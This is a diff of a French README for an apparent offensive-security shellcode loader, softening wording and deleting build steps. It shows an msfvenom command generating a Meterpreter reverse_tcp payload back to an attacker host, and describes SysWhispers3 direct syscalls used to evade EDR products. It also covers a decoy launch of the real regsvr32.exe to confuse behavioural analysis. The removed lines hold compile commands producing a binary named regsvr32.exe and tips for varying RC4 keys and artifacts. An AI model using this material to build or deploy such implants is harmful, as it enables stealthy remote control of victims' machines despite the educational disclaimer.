@@ -19,7 +19,7 @@ Le shellcode utilisé est typiquement un **Meterpreter** généré via `msfvenom
 ### 1. Générer le shellcode avec msfvenom
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.1.1.15 LPORT=443 -f c -o shellcode.txt
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=XXX -f c -o shellcode.txt
 ```
 
 ---
@@ -91,7 +91,7 @@ Le loader principal qui :
 
 ### `syscalls.c/.h/.obj`
 
-Générés avec [SysWhispers3](https://github.com/klezVirus/SysWhispers3). Contiennent les wrappers nécessaires aux syscalls directs, pour contourner les EDRs.
+Générés avec [SysWhispers3](https://github.com/klezVirus/SysWhispers3). Contiennent les wrappers nécessaires aux syscalls directs, pour contourner certains EDRs.
 
 ---
 
@@ -149,7 +149,7 @@ Utilise les appels noyau pour éviter `VirtualAlloc`, `VirtualProtect`, etc.
 
 ---
 
-### Masquage via regsvr32.exe
+### Exécution de regsvr32.exe
 
 ```c
 GetSystemDirectoryA(sysPath, MAX_PATH);
@@ -157,42 +157,15 @@ strcat(sysPath, "\\regsvr32.exe");
 CreateProcessA(...);
 ```
 
-Lance la vraie version de `regsvr32.exe` pour brouiller l’analyse comportementale (LOLBIN hijack légitime).
+Lance la vraie version de `regsvr32.exe` pour potentiellement brouiller l’analyse comportementale.
 
----
-
-## 🧪 Intégration SysWhispers3
-
-1. Générer les fichiers nécessaires :
-
-```bash
-python3 syswhispers.py -a x64 -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtTerminateProcess -o syscalls
-```
-
-2. Compiler `syscalls.asm` :
-
-```bash
-ml64 /c /Fo syscalls.obj syscalls.asm
-```
-
-3. Compiler le projet :
-
-```bash
-x86_64-w64-mingw32-gcc loader.c syscalls.c syscalls.obj -o "C:\DEV\regsvr32.exe" -mwindows -s -O2
-```
-
----
 
 ## 🧷 Notes complémentaires
 
 * Pense à regénérer `encrypted_payload.h` à chaque nouveau shellcode
-* Change la clé RC4 et le contenu de `junk()` pour varier les artefacts
-* Tout le code s’exécute **en mémoire** : aucun fichier malveillant n’est écrit
-
 ---
 
 ## ⚠️ Avertissement légal
 
 > 🔬 Ce projet est fourni uniquement à des fins pédagogiques et de **recherche en sécurité offensive**.  
-> ❌ Toute utilisation non autorisée sur un système tiers est **illégale**.  
 > 🛑 L’auteur décline toute responsabilité en cas d’usage malveillant.
